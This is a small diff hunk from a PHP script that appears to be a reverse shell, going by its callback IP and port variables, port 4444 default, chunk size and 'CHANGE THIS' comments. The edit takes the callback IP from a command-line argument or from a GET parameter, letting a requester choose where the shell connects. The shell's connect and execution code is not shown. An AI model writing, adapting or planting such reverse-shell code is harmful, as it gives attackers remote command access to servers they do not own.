@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = $_GET['ip'];  // CHANGE THIS
+$ip = isset($argv[1]) ? $argv[1] : $_GET['ip'];  // CHANGE THIS
 $port = $_GET['port'] ?? 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
